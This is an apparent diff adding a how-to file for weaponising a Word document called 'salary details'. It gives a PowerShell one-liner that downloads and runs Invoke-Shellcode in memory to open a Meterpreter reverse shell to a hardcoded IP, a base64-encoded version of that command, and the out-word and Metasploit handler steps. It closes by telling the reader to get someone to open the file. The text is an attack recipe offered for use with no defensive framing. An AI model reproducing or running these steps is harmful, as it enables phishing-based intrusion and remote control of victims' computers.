@@ -1,0 +1,62 @@
+##THings you will need##
+
+ 1. Kali Box
+
+ 2. Locate invoke-shellcode on github. As of 4/1/2016 this link works: https://raw.githubusercontent.com/AmmoArnie/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1
+
+ 3. Our payload (obviously replace the IP/port as appropriate):
+##first line downloads the invoke-shellcode script and loads it into memory. Second line opens our reverse shell back to metasploit##
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/AmmoArnie/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1"); Invoke-Shellcode  -Payload windows/meterpreter/reverse_http -Lhost 24.237.97.175 -Lport 4444 -Force
+
+ 4. Out-word script
+
+ 5. Port forwarding
+
+###############################################
+--First, we encode our command:
+
+$code={
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/AmmoArnie/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1"); Invoke-Shellcode  -Payload windows/meterpreter/reverse_http -Lhost 24.237.97.175 -Lport 4444 -Force
+}
+
+[convert]::tobase64string([text.encoding]::unicode.getbytes($code)) > C:\command.txt
+
+--Go to C:\command.txt and copy the string there.
+
+--Then we generate our word doc:
+
+	import-module .\out-word.psm1
+
+--Run the script: out-word -payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AQQBtAG0AbwBBAHIAbgBpAGUALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBtAGEAcwB0AGUAcgAvAEMAbwBkAGUARQB4AGUAYwB1AHQAaQBvAG4ALwBJAG4AdgBvAGsAZQAtAC0AUwBoAGUAbABsAGMAbwBkAGUALgBwAHMAMQAiACkAOwAgAEkAbgB2AG8AawBlAC0AUwBoAGUAbABsAGMAbwBkAGUAIAAgAC0AUABhAHkAbABvAGEAZAAgAHcAaQBuAGQAbwB3AHMALwBtAGUAdABlAHIAcAByAGUAdABlAHIALwByAGUAdgBlAHIAcwBlAF8AaAB0AHQAcABzACAALQBMAGgAbwBzAHQAIAAyADQALgAyADMANwAuADkANwAuADEANwA1ACAALQBMAHAAbwByAHQAIAA0ADQANAA0ACAALQBGAG8AcgBjAGUA"
+
+--THis will generate a word doc called "salary details" in the current directory.
+
+On your Kali box, open metasploit and type the following:
+
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set lhost $YourIP
+set lhost $port
+exploit
+
+--This will open a listener on $port. Note: you will need to forward this port to your internal IP.
+
+--Now, all you have to is get someone to open your word doc, and it will connect with a reverse shell.
+
+--From there, you can do things like type "execute -f cmd.exe -i -H" to open a cmd shell with the client machine.
+
+##############################################
+
+Useful resources:
+
+https://www.pentestgeek.com/penetration-testing/invoke-shellcode/
+http://colesec.inventedtheinternet.com/hacking-with-powershell-powersploit-and-invoke-shellcode/
+http://obscuresecurity.blogspot.com/2013/03/powersploit-metasploit-shells.html
+https://raw.githubusercontent.com/AmmoArnie/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1
+https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
+http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
+
+
+
+
